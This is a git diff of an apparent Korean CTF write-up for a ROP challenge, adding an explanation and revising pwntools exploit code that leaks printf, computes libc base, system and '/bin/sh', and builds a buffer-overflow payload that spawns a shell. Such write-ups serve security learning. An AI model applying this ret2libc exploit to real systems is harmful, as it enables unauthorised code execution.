@@ -24,7 +24,7 @@ p.interactive()
 
 ## problem 3
 
-ROP 문제로, 주어진 printf 함수의 실제 주소를 활용하여 system과 '/bin/sh'의 주소를 찾을 수 있다. 가젯의 주소를 찾기 위해서 pie를 우회해야 하는데, 
+ROP 문제로, 주어진 printf 함수의 실제 주소를 활용하여 system과 '/bin/sh'의 주소를 찾을 수 있다. 가젯의 주소를 찾기 위해서 pie를 우회해야 하는데, libc의 offset을 이용하여서 가젯의 실제 주소도 찾을 수 잇다. 이후 가젯과 binsh, system_addr를 사용하여 payload를 작성하면 된다.
 
 ```python
 
@@ -41,17 +41,7 @@ printf_addr = int(p.recv(14), 16)
 libc_base = printf_addr - libc.symbols['printf']
 system_addr = libc_base + libc.symbols['system']
 binsh = libc_base + list(libc.search(b'/bin/sh'))[0]
-
-payload = b'A'*0x20
-payload += b'B'*0x8
-payload += p64(pop_rdi)
-payload += p64(binsh)
-#payload += p64(pop_rdi+1)
-payload += p64(system_addr)
-
-pie_base = printf_addr - 0x1040
-
-pop_rdi = pie_base + (rop.find_gadget(['pop rdi', 'ret']))[0]
+pop_rdi = libc_base + (rop.find_gadget(['pop rdi', 'ret']))[0]
 
 log.info("libc base : %s"%hex(libc_base))
 log.info("system addr : %s"%hex(system_addr))
@@ -62,7 +52,6 @@ payload = b'A'*0x20
 payload += b'B'*0x8
 payload += p64(pop_rdi)
 payload += p64(binsh)
-#payload += p64(pop_rdi+1)
 payload += p64(system_addr)
 
 p.sendline(payload)
